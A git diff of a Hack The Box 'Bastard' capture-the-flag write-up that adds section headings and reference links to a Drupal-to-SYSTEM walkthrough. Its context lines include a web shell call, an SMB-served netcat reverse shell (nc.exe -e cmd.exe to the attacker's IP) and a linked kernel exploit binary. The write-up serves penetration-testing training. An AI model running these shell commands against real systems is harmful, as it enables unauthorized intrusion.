@@ -34,6 +34,11 @@ Check **http://10.10.10.9/CHANGELOG.txt**.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5163edd8-e04c-472a-bd4e-45e64c7c4083)
 
+
+## Exploitation & Gaining Access
+
+### Method 1: Drupal CVE:N/A [1](https://www.exploit-db.com/exploits/41564)
+
 Run searchsploit:
 
 ```
@@ -41,7 +46,10 @@ searchsploit drupal 7.x
 
 searchsploit -m 41564
 ```
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d11fa67b-28a5-4a61-a50f-57a97b5b080c)
+
+Exploit CVE:N/A [1](https://www.exploit-db.com/exploits/41564):
 
 ```
 gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.9/ -k -n -r -t 10 --exclude-length 1233
@@ -84,8 +92,6 @@ Execute **http://10.10.10.9/cmd.php?cmd=whoami%20/all**
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/557645c5-3039-4d4c-ab37-c4e5a0a724b8)
 
-
-## Exploitation & Gaining Access
 ```
 # On the kali attack vm: Start smbserver to share a copy of nc.exe
 smbserver.py win /usr/share/windows-binaries/
@@ -102,6 +108,10 @@ http://10.10.10.9/cmd.php?cmd=\\10.10.14.24\win\nc.exe -e cmd.exe 10.10.14.24 44
 Get the revershell, and read user flag:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/652b50a0-4934-4ecd-8c70-20636bc5ac0d)
+
+
+### Method 2: Drupal Session Cookie Bypass and Code/Command Injection
+Check the different solution [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bastard-writeup-w-o-metasploit#id-03d0)
 
 
 ## Privilege Escalation
@@ -143,16 +153,19 @@ Get the shell as **nt authority\system**, and read the root flag:
 
 # References & Alternatives
 + https://vvmlist.github.io/#Bastard
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bastard-writeup-w-o-metasploit
++ https://0xdf.gitlab.io/2019/03/12/htb-bastard.html
 + 
 
 
 ## CVE Scripting
++ **Drupal:** CVE:N/A [1](https://www.exploit-db.com/exploits/41564)
 + **MS10–059:**
     + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe 
 
 
 ## Tools
-+  
++ **netcat:** https://eternallybored.org/misc/netcat/
 
 
 ## Technical Knowledge
@@ -166,4 +179,4 @@ Get the shell as **nt authority\system**, and read the root flag:
 
 
 ## For More
-+ 
++ https://www.ambionics.io/blog/drupal-services-module-rce
